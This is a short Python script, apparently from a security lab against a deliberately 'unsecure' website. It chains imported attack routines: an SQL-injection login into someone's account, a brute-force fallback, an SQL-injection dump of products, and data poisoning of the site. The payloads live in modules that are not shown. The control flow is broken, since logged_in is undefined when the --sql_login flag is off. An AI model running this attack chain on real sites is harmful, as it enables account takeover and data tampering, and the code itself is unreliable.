from brute_force_attack import username_brute, length_brute
from data_poisoning import automatic_search
from sql_injection import sql_injection, sql_login
import requests
import argparse

def run_combined(args):
    sql_log = args.sql_login
    
    # Login into somoeone's account with SQL injection
    if sql_log:
        logged_in, session = sql_login()
        if not logged_in:
            print('Login failed')
            print('Trying brute force login...')
            # Login someone's account with brute force
            logged_in, username, password, session = username_brute()
            

    if logged_in:
        print('Logged in successfully!')
        # Obtain a list of products
        products_list = sql_injection(session)

        # Do data poisoning
        automatic_search(session, products_list)
    else:
        print('Failed to log in')

if __name__=='__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--sql_login', action='store_true', default=False)
    parser.add_argument('--path', type=str, default='data.csv')
    parser.add_argument('--dates_update', action='store_true', default=True)
    parser.add_argument('--from_dataset', action='store_true', default=False)
    parser.add_argument('--database', type=str, default='../unsecure_website/database.db')
    parser.add_argument("-f", "--file", required=False)
    args = parser.parse_args()
    run_combined(args)
    
